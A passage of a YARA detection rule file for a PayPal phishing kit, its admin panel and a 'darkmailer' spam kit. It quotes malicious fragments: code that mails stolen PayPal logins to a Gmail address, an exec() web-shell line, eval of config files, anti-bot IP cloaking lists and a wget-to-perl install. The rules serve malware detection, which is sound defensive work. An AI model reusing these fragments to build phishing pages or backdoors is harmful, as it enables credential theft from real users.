      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

rule identity {
   meta:
      description = "case127 - file identity.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "aad4d52ca04dee99101dcd04409c75412e1fc1b43222f5b18c3344922d752a04"
   strings:
      $s1 = "$query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));" fullword ascii
      $s2 = "} elseif ( isset($_SERVER['HTTP_X_FORWARDED_FOR']) && ! empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {" fullword ascii
      $s3 = "$(\"<div class=\\\"jFiler-item-others text-error\\\"><i class=\\\"icon-jfi-minus-circle\\\"></i> Error</div>\").hi" fullword ascii
      $s4 = "<meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\"  />" fullword ascii
      $s5 = "$ip = (isset($_SERVER['REMOTE_ADDR'])) ? $_SERVER['REMOTE_ADDR'] : '0.0.0.0';" fullword ascii
      $s6 = "<script type=\"text/javascript\" src=\"./ID/identity/js/jquery-latest.min.js\"></script>" fullword ascii
      $s7 = "<link href=\"./ID/identity/css/jquery.filer.css\" type=\"text/css\" rel=\"stylesheet\"  media=\"screen\" />" fullword ascii
      $s8 = "<script type=\"text/javascript\" src=\"./ID/identity/js/jquery.filer.min.js\"></script>" fullword ascii
      $s9 = "$(\"<div class=\\\"jFiler-item-others text-success\\\"><i class=\\\"icon-jfi-check-circle\\\"></i> Success</div>\"" fullword ascii
      $s10 = "filesSizeAll: \"Files you've choosed are too large! Please upload files up to {{fi-maxSize}} MB.\"" fullword ascii
      $s11 = "changeInput: '<div class=\"jFiler-input-dragDrop\"><div class=\"jFiler-input-inner\"><div class=\"jFiler-input-icon\"><i c" fullword ascii
      $s12 = "if ( isset($_SERVER['HTTP_CLIENT_IP']) && ! empty($_SERVER['HTTP_CLIENT_IP'])) {" fullword ascii
      $s13 = "// Get user IP address" fullword ascii
      $s14 = "this.getID(el).style.display='';" fullword ascii
      $s15 = "$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];" fullword ascii
      $s16 = "echo \"<form method='POST' enctype='multipart/form-data'>" fullword ascii
      $s17 = "<link rel=\"stylesheet\" href=\"./ID/dzx/css/loading.css\" media=\"screen\" />" fullword ascii
      $s18 = "filesSize: \"{{fi-name}} is too large! Please upload file up to {{fi-maxSize}} MB.\"," fullword ascii
      $s19 = "<link rel=\"stylesheet\" type=\"text/css\" href=\"./gg/zeb.css\">" fullword ascii
      $s20 = "<script type=\"text/javascript\" src=\"./ID/dzx/js/info.js\"></script>" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 40KB and
         ( 8 of them )
      ) or ( all of them )
}

rule PAYPAL_PHISHING_001_infected_06_08_18_case127_files_Billing {
   meta:
      description = "case127 - file Billing.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "5eda8b34d08c8a2b313072130adf38a7ab15b1507615406608274cf8d5ee32e5"
   strings:
      $s1 = "<script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js\"></script>" fullword ascii
      $s2 = "<script src=\"http://code.jquery.com/jquery-2.1.4.min.js\"></script>" fullword ascii
      $s3 = "<input type=\"text\" required name=\"zip\" placeholder=\"Code postal\"  style=\"width: 49%; float: left;\">" fullword ascii
      $s4 = "<p>Parfois, nous vous poserons une question unique pour v&eacute;rifier qui vous &ecirc;tes.</p>" fullword ascii
      $s5 = "<input  type=\"number\" required name=\"fnumber\" id=\"phone\"  placeholder=\"Mobile\" style=\"width: 49%; float" fullword ascii
      $s6 = "<h4>Nous allons maintenant v&eacute;rifier les informations de votre compte PayPal.</h4>" fullword ascii
      $s7 = "<input pattern=\"^([0][1-9]|[12][0-9]|3[01])(/)([0][1-9]|[1][0-2])\\2(\\d{4})$\" type=\"text\" name=\"dob\" " fullword ascii
      $s8 = "<input type=\"text\" name=\"fname\" required placeholder=\"Pr&eacute;nom\" style=\"width: 49%; float: left;\">" fullword ascii
      $s9 = "<input type=\"text\" name=\"fname\" required placeholder=\"Pr&eacute;nom\" style=\"width: 49%; float: left;" fullword ascii
      $s10 = "<input type=\"text\" name=\"lname\" required placeholder=\"Nom\"  style=\"width: 49%; float: right;\"></div>" fullword ascii
      $s11 = "<form method=\"post\" action=\"N_Vier2.php\">" fullword ascii
      $s12 = "<p>Notre &eacute;quipe de s&eacute;curit&eacute; travaille 24/7 pour vous prot&eacute;ger. Nous sommes l" fullword ascii
      $s13 = "<link href=\"css/style.css\" rel=\"stylesheet\" type=\"text/css\">" fullword ascii
      $s14 = "<meta name=\"robots\" content=\"noindex\" />" fullword ascii
      $s15 = "<h2>Aidez-nous &agrave; vous garder en s&eacute;curit&eacute;</h2>" fullword ascii
      $s16 = "<link rel=\"icon\" href=\"css/fav.ico\" />" fullword ascii
      $s17 = "<script src=\"../js/jquery.maskedinput.min.js\"></script>" fullword ascii
      $s18 = "<script>print_country(\"country\");</script>" fullword ascii
      $s19 = "<button type=\"submit\" class=\"btn btnPremary\" style=\"padding-left: 30px;padding-right: 40px;\" nam" fullword ascii
      $s20 = "if( $(this).val().length === 0 ) {" fullword ascii
   condition:
      ( uint16(0) == 0x213c and
         filesize < 10KB and
         ( 8 of them )
      ) or ( all of them )
}

rule PAYPAL_PHISHING_001_infected_06_08_18_case127_index {
   meta:
      description = "case127 - file index.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "f2b3619d83488866c194527d707cdbd182baa72e1b35c668fd031284ee8a3862"
   strings:
      $s1 = "fwrite($file,$ip.\" || \".gmdate (\"Y-n-d\").\" ----> \".gmdate (\"H:i:s\").\"\\n\");" fullword ascii
      $s2 = "$ip = getenv(\"REMOTE_ADDR\");" fullword ascii
      $s3 = "$file = fopen(\"drspam.txt\",\"a\");" fullword ascii
      $s4 = "while(false !== ( $file = readdir($dir)) ) {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

rule PAYPAL_PHISHING_001_infected_06_08_18_case127_files_Antibots_anti {
   meta:
      description = "case127 - file anti.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "3b9405fcf832d194ee1d073d60079275e79942235c4fb773ab11c600201e07ea"
   strings:
      $s1 = "echo \"HELLO BITCH BOOTS YOU ARE LOCKED BY X-GHOST MA| I FUCKING LOVE YOU HAHAHHAHAHAHAHAHAHAHAHAH YLEH LOOOD T7OWA B L3RBIY" fullword ascii
      $s2 = "#       ||~ http://fb.com/profile.php?id=100013164673156 ~||       #" fullword ascii
      $s3 = "if (stripos($_SERVER['HTTP_USER_AGENT'],$word2)){" fullword ascii
      $s4 = "\"68.65.53.71\"," fullword ascii /* hex encoded string 'heSq' */
      $s5 = "\"192.comagent\"," fullword ascii
      $s6 = "\"searchprocess\"," fullword ascii
      $s7 = "\"inktomisearch.com\"," fullword ascii
      $s8 = "\"addthis.com\"," fullword ascii
      $s9 = "\"skymob.com\"," fullword ascii
      $s10 = "\"amagit.com\"," fullword ascii
      $s11 = "\"ah-ha.com\"," fullword ascii
      $s12 = "\"^212.150.*.*\"," fullword ascii /* hex encoded string '!!P' */
      $s13 = "\"^64.233.160.*\"," fullword ascii /* hex encoded string 'd#1`' */
      $s14 = "\"^66.207.120.*\"," fullword ascii /* hex encoded string 'f q ' */
      $s15 = "\"^212.143.*.*\"," fullword ascii /* hex encoded string '!!C' */
      $s16 = "\"^217.132.*.*\"," fullword ascii /* hex encoded string '!q2' */
      $s17 = "\"^212.235.*.*\"," fullword ascii /* hex encoded string '!"5' */
      $s18 = "\"pgp key agent\"," fullword ascii
      $s19 = "if (preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])) {" fullword ascii
      $s20 = "\"^216.239.32.*\"," fullword ascii /* hex encoded string '!b92' */
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 30KB and
         ( 8 of them )
      ) or ( all of them )
}

rule PAYPAL_PHISHING_001_infected_06_08_18_case127_files_my_blocker {
   meta:
      description = "case127 - file blocker.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "4cdb5c239c8b72290a1ee526a844334c283baa4f4689a4d855a1814fe56c1996"
   strings:
      $s1 = "$host=$_GET['ip'];echo exec($host);" fullword ascii
      $s2 = "$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);" fullword ascii
      $s3 = "') or strpos($_SERVER['HTTP_USER_AGENT'], 'bingbot') or strpos($_SERVER['HTTP_USER_AGENT'], 'crawler') or strpos($_SERVER['HTTP_" ascii
      $s4 = "if(strpos($_SERVER['HTTP_USER_AGENT'], 'google') or strpos($_SERVER['HTTP_USER_AGENT'], 'msnbot') or strpos($_SERVER['HTTP_USER_" ascii
      $s5 = "header(\"HTTP/1.0 404 Not Found\");" fullword ascii
      $s6 = "USER_AGENT'], 'PycURL') or strpos($_SERVER['HTTP_USER_AGENT'], 'facebookexternalhit') !== false) { header('HTTP/1.0 404 Not Foun" ascii
      $s7 = "if(strpos($_SERVER['HTTP_USER_AGENT'], 'google') or strpos($_SERVER['HTTP_USER_AGENT'], 'msnbot') or strpos($_SERVER['HTTP_USER_" ascii
      $s8 = "AGENT'], 'Yahoo! Slurp') or strpos($_SERVER['HTTP_USER_AGENT'], 'YahooSeeker') or strpos($_SERVER['HTTP_USER_AGENT'], 'Googlebot" ascii
      $s9 = "if (substr_count($hostname, $word) > 0) {" fullword ascii
      $s10 = "if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){" fullword ascii
      $s11 = "die(\"<h1>404 Not Found</h1>The page that you have requested could not be found.\");" fullword ascii
      $s12 = "$bannedIP = array(\"^66.102.*.*\", \"^38.100.*.*\", \"^107.170.*.*\", \"^149.20.*.*\", \"^38.105.*.*\", \"^74.125.*.*\",  \"^66." ascii
      $s13 = "if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 7KB and
         ( 8 of them )
      ) or ( all of them )
}

rule PAYPAL_PHISHING_001_infected_06_08_18_case127_files_bots {
   meta:
      description = "case127 - file bots.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "41af449e6806caeb6c0679cecaebc0bb8b2e7b7f2b1351ed4c8788014dfdbbfa"
   strings:
      $s1 = "$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);" fullword ascii
      $s2 = "178.*\", \"68.65.53.71\", \"^198.25.*.*\", \"^64.106.213.*\", \"^91.103.66.*\", \"^208.91.115.*\", \"^199.30.228.*\");" fullword ascii
      $s3 = "header(\"HTTP/1.0 404 Not Found\");" fullword ascii
      $s4 = "if (substr_count($hostname, $word) > 0) {" fullword ascii
      $s5 = "if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){" fullword ascii
      $s6 = "die(\"<h1>404 Not Found</h1>The page that you have requested could not be found.\");" fullword ascii
      $s7 = "$bannedIP = array(\"^81.161.59.*\", \"^66.135.200.*\", \"^66.102.*.*\", \"^38.100.*.*\", \"^107.170.*.*\", \"^149.20.*.*\", \"^3" ascii
      $s8 = "if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 6KB and
         ( all of them )
      ) or ( all of them )
}

rule PAYPAL_PHISHING_001_infected_06_08_18_case127_pfr {
   meta:
      description = "case127 - file pfr.zip"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "72f57bb63927967259bbc740d1dce85f1bdb99458933a9d91e164d02051fa216"
   strings:
      $s1 = "files/my/ID/identity/css/themes/jquery.filer-dragdropbox-theme.css" fullword ascii
      $s2 = "files/css/paypal_logo_center.png" fullword ascii
      $s3 = "files/my/ID/identity/images/ppcom_monogram.svg}V" fullword ascii
      $s4 = "files/file/template.css" fullword ascii
      $s5 = "files/css/themes/jquery.filer-dragdropbox-theme.css" fullword ascii
      $s6 = "files/css/peek-shield-logo.png" fullword ascii
      $s7 = "files/images/logo.png}Vy8T{" fullword ascii
      $s8 = "files/my/ID/identity/images/ppcom_monogram.svg" fullword ascii
      $s9 = "files/my/ID/identity/assets/fonts/jquery.filer-icons/jquery-filer.svg" fullword ascii
      $s10 = "files/my/ID/identity/assets/fonts/jquery.filer-icons/jquery-filer.ttf" fullword ascii
      $s11 = "files/my/ID/identity/assets/fonts/jquery.filer-icons/jquery-filer.css" fullword ascii
      $s12 = "files/my/ID/identity/assets/fonts/jquery.filer-icons/jquery-filer.eot" fullword ascii
      $s13 = "files/img/logo.png" fullword ascii
      $s14 = "files/images/logo.png" fullword ascii
      $s15 = "files/css/authflow_illustrations.png" fullword ascii
      $s16 = "files/my/ID/identity/images/ppcom.svg" fullword ascii
      $s17 = "files/javascript/jquery-1.11.2.min.js" fullword ascii
      $s18 = "files/css/peek-shield-logo.pnguW" fullword ascii
      $s19 = "r3zult/index.txt" fullword ascii
      $s20 = "files/my/ID/identity/assets/fonts/jquery.filer-icons/jquery-filer-preview.html" fullword ascii
   condition:
      ( uint16(0) == 0x4b50 and
         filesize < 3000KB and
         ( 8 of them )
      ) or ( all of them )
}

rule PAYPAL_PHISHING_001_infected_06_08_18_case127_files_style {
   meta:
      description = "case127 - file style.css"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "562e585efab210b7cbdb49a5f72814f7d561486e7368159e1ef38531d38afc88"
   strings:
      $x1 = "background: transparent url(\"https://www.paypalobjects.com/images/shared/paypal-logo-129x32.svg\") no-repeat scroll center to" fullword ascii
      $x2 = "background: transparent url(\"https://www.paypalobjects.com/images/shared/paypal-logo-129x32.svg\") no-repeat scroll cente" fullword ascii
      $x3 = "background: #FFF7F7 url(\"https://www.paypalobjects.com/images/shared/icon_alert_sprite-2x.png\") no-repeat scroll 10px -386px" fullword ascii
      $x4 = "background: #F8F8F8 url(\"https://www.paypalobjects.com/webstatic/i/ex_ce2/scr/scr_content-bkgd.png\") repeat scroll 0px 0px;" fullword ascii
      $x5 = "background: transparent url(\"https://www.paypalobjects.com/webstatic/i/sprite/sprite_ui.png\") no-repeat scroll right -1684px" fullword ascii
      $x6 = "background: transparent url(\"https://www.paypalobjects.com/webstatic/i/sprite/sprite_ui.png\") no-repeat scroll right -1684px;" fullword ascii
      $s7 = "background: transparent url(\"https://www.paypalobjects.com/webstatic/mktg/consumer/auth/authflow_illustrations.png\") no-repe" fullword ascii
      $s8 = "background: transparent url(\"https://www.paypalobjects.com/webstatic/mktg/consumer/gradients/interior-gradient-top.png\") rep" fullword ascii
      $s9 = "background-image: url(\"https://www.paypalobjects.com/webstatic/i/consumer/onboarding/sprite_form_2x.png\");" fullword ascii
      $s10 = "background: transparent url(\"https://www.paypalobjects.com/images/shared/paypal-logo-129x32.svg\") no-repeat scroll center top " ascii
      $s11 = "background: transparent url(\"https://www.paypalobjects.com/images/shared/paypal-logo-129x32.svg\") no-repeat scroll center top " ascii
      $s12 = "background: transparent url(\"https://www.paypalobjects.com/images/shared/paypal-logo-129x32.svg\") no-repeat scroll center top " ascii
      $s13 = "background: #FFF7F7 url(\"https://www.paypalobjects.com/images/shared/icon_alert_sprite-2x.png\") no-repeat scroll 10px -386px /" ascii
      $s14 = "background: transparent url(\"https://www.paypalobjects.com/webstatic/mktg/consumer/auth/authflow_illustrations.png\") no-repeat" ascii
      $s15 = "background: transparent url(\"img/sprites_cc_global.png\") no-repeat scroll 0 -337px / 100% auto;" fullword ascii
      $s16 = "background: transparent url(\"img/sprites_cc_global.png\") no-repeat scroll 0 -314px / 100% auto;" fullword ascii
      $s17 = "background: transparent url(\"img/sprites_cc_global.png\") no-repeat scroll 0px -337px / 100% auto;" fullword ascii
      $s18 = "background: transparent url(\"authflow_illustrations.png\") no-repeat scroll 0px 0px / 180px auto;" fullword ascii
      $s19 = "background: transparent url(\"hero_security.png\") no-repeat scroll -17px 0px / 180px auto;" fullword ascii
      $s20 = "background: url(\"img/sprites_cc_global.png\") no-repeat scroll 0 -66px / 100% auto;" fullword ascii
   condition:
      ( uint16(0) == 0x0a0d and
         filesize < 70KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule htaccess {
   meta:
      description = "case127 - file htaccess"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "12a5ff666829220eeadb0496eea0481308387824ea6e3fcaabfe4b1d449a7565"
   strings:
      $x1 = "RewriteCond %{HTTP_USER_AGENT} webclipping [NC,OR] # bandwidth waster webclipping.com " fullword ascii
      $x2 = "RewriteCond %{HTTP_USER_AGENT} madlyrics [NC,OR] # Winamp downloader " fullword ascii
      $x3 = "RewriteCond %{HTTP_USER_AGENT} picsearch [NC,OR] # Picture Downloader " fullword ascii
      $x4 = "RewriteCond %{HTTP_USER_AGENT} psbot [NC,OR] # Picture Downloader " fullword ascii
      $x5 = "RewriteCond %{HTTP_USER_AGENT} dloader [NC,OR] # unknown downloader " fullword ascii
      $x6 = "RewriteCond %{HTTP_USER_AGENT} hloader [NC,OR] # unknown downloader " fullword ascii
      $x7 = "RewriteCond %{HTTP_USER_AGENT} trademark [NC,OR] # bandwidth waster trademarktracker.com " fullword ascii
      $x8 = "RewriteCond %{HTTP_USER_AGENT} \"addresses\\.com\" [NC,OR] # spambot " fullword ascii
      $s9 = "RewriteCond %{HTTP_USER_AGENT} e?mail.?(collector|magnet|reaper|siphon|sweeper|harvest|collect|wolf) [NC,OR] # spambots " fullword ascii
      $s10 = "RewriteCond %{HTTP_USER_AGENT} web.?(auto|bandit|collector|copier|devil|downloader|fetch|hook|mole|miner|mirror|reaper|sauger|su" ascii
      $s11 = "RewriteCond %{HTTP_USER_AGENT} ConveraCrawler [NC,OR] # convera.com " fullword ascii
      $s12 = "RewriteCond %{HTTP_USER_AGENT} web.?(auto|bandit|collector|copier|devil|downloader|fetch|hook|mole|miner|mirror|reaper|sauger|su" ascii
      $s13 = "RewriteCond %{HTTP_USER_AGENT} linksmanager [NC,OR] # linksmanager.com spambot " fullword ascii
      $s14 = "RewriteCond %{HTTP_USER_AGENT} girafabot [NC,OR] # girafa.com SE thingy " fullword ascii
      $s15 = "RewriteCond %{HTTP_USER_AGENT} cjnetworkquality [NC,OR] # cj.com bot " fullword ascii
      $s16 = "RewriteCond %{HTTP_USER_AGENT} twiceler [NC,OR] # www.cuill.com " fullword ascii
      $s17 = "RewriteCond %{HTTP_USER_AGENT} ocelli [NC,OR] # www.globalspec.com " fullword ascii
      $s18 = "RewriteCond %{HTTP_USER_AGENT} \"mozilla\\(ie compatible\\)\" [NC,OR] # BS agent " fullword ascii
      $s19 = "RewriteCond %{HTTP_USER_AGENT} \"www.abot.com\" [NC,OR] " fullword ascii
      $s20 = "RewriteCond %{HTTP_USER_AGENT} convera [NC,OR] # convera.com " fullword ascii
   condition:
      ( uint16(0) == 0x4c3c and
         filesize < 100KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule Connexion {
   meta:
      description = "case127 - file Connexion.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "f870c54924b19592e0c7b82c3eb87441b0ff986c6af5100ddff6455a500de638"
   strings:
      $s1 = "<form id=\"loginForm\" method=\"post\" action=\"N_Vier1.php\">" fullword ascii
      $s2 = "<script src=\"http://code.jquery.com/jquery-2.1.4.min.js\"></script>" fullword ascii
      $s3 = "<input pattern=\".{7,}\" required  type=\"password\" name=\"login_password\" placeholder=\"Password\">" fullword ascii
      $s4 = "<input required type=\"email\" name=\"login_email\" placeholder=\"Email\">" fullword ascii
      $s5 = "<button type=\"submit\" name=\"BtnLogin\" class=\"button\">Connexion</button>" fullword ascii
      $s6 = "$(\"#loginForm\").submit(function(){" fullword ascii
      $s7 = "<?php if(isset($_GET['error']) == \"true\"){" fullword ascii
      $s8 = "<link href=\"css/style.css\" rel=\"stylesheet\" type=\"text/css\">" fullword ascii
      $s9 = "<title>Connectez-vous &agrave; votre compte PayPal</title>" fullword ascii
      $s10 = "<meta name=\"robots\" content=\"noindex\" />" fullword ascii
      $s11 = "<link rel=\"icon\" type=\"img/png\" href=\"img/favicon.ico\">" fullword ascii
      $s12 = "Certaines de vos informations ne sont pas correctes. Veuillez r&eacute;essayer." fullword ascii
      $s13 = "include 'config.php';" fullword ascii
      $s14 = "$(\".textinput input\").keyup(function () {" fullword ascii
      $s15 = "if ($.trim($(this).val()).length == 0){" fullword ascii
      $s16 = "<li><a href=\"#\">Respect de la vie priv&eacute;e</a></li>" fullword ascii
      $s17 = "$('.spinner').css(\"display\",'block');" fullword ascii
      $s18 = "$('.contenair').css('opacity','0.1');" fullword ascii
      $s19 = "$('.footer').css('opacity','0.1');" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 9KB and
         ( 8 of them )
      ) or ( all of them )
}

rule PAYPAL_PHISHING_001_infected_06_08_18_case127_files_N_Vier1 {
   meta:
      description = "case127 - file N_Vier1.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "3e15a86132e2a3423bc3101968c1b7e5ec2a23729f60640635024908db3654a4"
   strings:
      $s1 = "$subject = 'Login Account [ '.$country.' - '.$_SERVER['REMOTE_ADDR'].' ]';" fullword ascii
      $s2 = "header(\"location: suspicious.php?cmd=_account-details&session=\".md5(microtime()).\"&dispatch=\".sha1(microtime()));" fullword ascii
      $s3 = "$dump = unserialize(file_get_contents($u));" fullword ascii
      $s4 = "$message .= '|Password            :  '.$_POST['login_password'].\"\\r\\n\";" fullword ascii
      $s5 = "$message .= '|Email               :  '.$_POST['login_email'].\"\\r\\n\";" fullword ascii
      $s6 = "$u = \"http://www.geoiptool.com/?IP='$ip'\";" fullword ascii
      $s7 = "$message .= \"IP Geo       : http://www.geoiptool.com/?IP=\".$ip.\"  ====\\n\";" fullword ascii
      $s8 = "mail(\"rezult277@gmail.com\", $subject, $message);" fullword ascii
      $s9 = "$country = $dump[\"geoplugin_countryName\"];" fullword ascii
      $s10 = "$ip = getenv(\"REMOTE_ADDR\");" fullword ascii
      $s11 = "$messags   =  \"http://\".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'].\"\\r\\n\";" fullword ascii
      $s12 = "$message = '|================ bs7a rzlt ===============|'.\"\\r\\n\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 2KB and
         ( 8 of them )
      ) or ( all of them )
}

/* Super Rules ------------------------------------------------------------- */

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-14
   Identifier: admin
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */



rule paypal_phishing_admin_general {
   meta:
      description = "admin - file general.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-14"
      hash1 = "73897614ef03665e7929e28409dc176e38cd29dda1f7c4c0c5718823b4624d1e"
   strings:
      $s1 = "<input type=\"password\" name=\"apikey\" <?php if($xconfig == true){ echo \"value=\\\"$config_apikey\\\"\"; } ?> required>" fullword ascii
      $s2 = "@eval(file_get_contents($api->dir_config . '/' . $api->general_config));" fullword ascii
      $s3 = "<input type=\"text\" name=\"email\" <?php if($xconfig == true){ echo \"value=\\\"$email_result\\\"\"; } ?> required>" fullword ascii
      $s4 = "<div class=\"left\">Identity Photo<span>allow victim to upload their identity.</span></div>" fullword ascii
      $s5 = "<?php if($xconfig == true && $config_smtp == 1){" fullword ascii
      $s6 = "<form method=\"post\" action=\"\" autocomplete=\"off\">" fullword ascii
      $s7 = "<?php require 'page/header.php'; ?>" fullword ascii
      $s8 = "echo '<option value=\"1\" selected>smtp</option>" fullword ascii
      $s9 = "$a = $_POST['apikey'];" fullword ascii
      $s10 = "if (file_exists($api->dir_config . '/' . $api->general_config))" fullword ascii
      $s11 = "<?php if($xconfig == true && $config_translate == 1){" fullword ascii
      $s12 = "<?php if($xconfig == true && $config_filter == 1){" fullword ascii
      $s13 = "<?php if($xconfig == true && $config_3dsecure == 1){" fullword ascii
      $s14 = "<?php if($xconfig == true && $config_identity == 1){" fullword ascii
      $s15 = "<?php if($xconfig == true && $config_blocker == 1){" fullword ascii
      $s16 = "echo '<option value=\"1\">smtp</option>" fullword ascii
      $s17 = "$b = $_POST['3dsecure'];" fullword ascii
      $s18 = "$f = $_POST['translate'];" fullword ascii
      $s19 = "$photo = $_POST['identity'];" fullword ascii
      $s20 = "if (isset($_GET['success']))" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 20KB and
         ( 8 of them )
      ) or ( all of them )
}

rule paypal_phishing_admin_smtp {
   meta:
      description = "admin - file smtp.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-14"
      hash1 = "3c5d695e3cb12293577e118e2f84df13538945e47c219275afec10e2764161e7"
   strings:
      $s1 = "<input type=\"text\" name=\"smtphost\" <?php if($xconfig == true){ echo \"value=\\\"$config_smtphost\\\"\"; } ?> required>" fullword ascii
      $s2 = "<input type=\"text\" name=\"smtpuser\" <?php if($xconfig == true){ echo \"value=\\\"$config_smtpuser\\\"\"; } ?> required>" fullword ascii
      $s3 = "<input type=\"text\" name=\"smtpport\" <?php if($xconfig == true){ echo \"value=\\\"$config_smtpport\\\"\"; } ?> required>" fullword ascii
      $s4 = "<input type=\"text\" name=\"smtppass\" <?php if($xconfig == true){ echo \"value=\\\"$config_smtppass\\\"\"; } ?> required>" fullword ascii
      $s5 = "<input type=\"text\" name=\"smtpfrom\" <?php if($xconfig == true){ echo \"value=\\\"$config_smtpfrom\\\"\"; } ?> required>" fullword ascii
      $s6 = "<input type=\"text\" name=\"smtpname\" <?php if($xconfig == true){ echo \"value=\\\"$config_smtpname\\\"\"; } ?> required>" fullword ascii
      $s7 = "@eval(file_get_contents($api->dir_config . '/' . $api->smtp_config));" fullword ascii
      $s8 = "if (file_exists($api->dir_config . '/' . $api->smtp_config))" fullword ascii
      $s9 = "<?php if($xconfig == true && $config_smtpsecure == 1){" fullword ascii
      $s10 = "<form method=\"post\" action=\"\" autocomplete=\"off\">" fullword ascii
      $s11 = "$a = $_POST['smtphost'];" fullword ascii
      $s12 = "else if (isset($_GET['failed']))" fullword ascii
      $s13 = "<?php require 'page/header.php'; ?>" fullword ascii
      $s14 = "$api->redirect(\"smtp?failed=true\");" fullword ascii
      $s15 = "$api->setSMTP(array($a, $b, $c, $d, $e, $f, $g));" fullword ascii
      $s16 = "$b = $_POST['smtpport'];" fullword ascii
      $s17 = "$e = $_POST['smtppass'];" fullword ascii
      $s18 = "$d = $_POST['smtpuser'];" fullword ascii
      $s19 = "$api->redirect(\"smtp?connect=success\");" fullword ascii
      $s20 = "<div class=\"left\">SMTP Host</div>" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 10KB and
         ( 8 of them )
      ) or ( all of them )
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-25
   Identifier: .proba
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_08_25_18_darkmailer__proba_install {
   meta:
      description = ".proba - file install.sh"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-25"
      hash1 = "25d996431965b818ade25fc03fdb756e6e58306bddcda7e32b1f69dcb5d4846e"
   strings:
      $s1 = "wget -O-  --no-check-certificate http://cpanmin.us | perl - -l ~/perl5 App::cpanminus local::lib" fullword ascii
      $s2 = "echo 'eval `perl -I ~/perl5/lib/perl5 -Mlocal::lib`' >> ~/.profile" fullword ascii
      $s3 = "declare -x HOME=\"$this\"" fullword ascii
      $s4 = "echo 'export MANPATH=$HOME/perl5/man:$MANPATH' >> ~/.profile" fullword ascii
      $s5 = "eval `perl -I ~/perl5/lib/perl5 -Mlocal::lib`" fullword ascii
   condition:
      ( uint16(0) == 0x2123 and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

rule infected_08_25_18_darkmailer__proba_send {
   meta:
      description = ".proba - file send.sh"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-25"
      hash1 = "2474d6f0ec11bda8df544653d8001380ad63540b2e3fefad85204593d1c88b15"
   strings:
      $s1 = "perl -Mlib=${this}/perl5/lib/perl5/ send2.pl body.html list.txt" fullword ascii
      $s2 = "declare -x HOME=\"$this\"" fullword ascii
   condition:
      ( uint16(0) == 0x2123 and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}


rule infected_08_25_18_darkmailer__proba_send2 {
   meta:
      description = ".proba - file send2.pl"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-25"
      hash1 = "1f03fcef96ec0b0300e4b2adfdcf19bb7767afbb08f0e0d528def7cfa0dec323"
   strings:
      $s1 = "my $processid = $forkmanager->start() and next;" fullword ascii
      $s2 = "my $Subject = 'REVENUE Tax refund - 490,99 EUR'; # subject for mails" fullword ascii
      $s3 = "print \"perl send.pl <email_body_file> <email_list_file> <threads>\\n\";" fullword ascii
      $s4 = "'content-type' => \"text/html; charset=\\\"iso-8859-1\\\"\"" fullword ascii
      $s5 = "print \"It works like this:\\n\";" fullword ascii
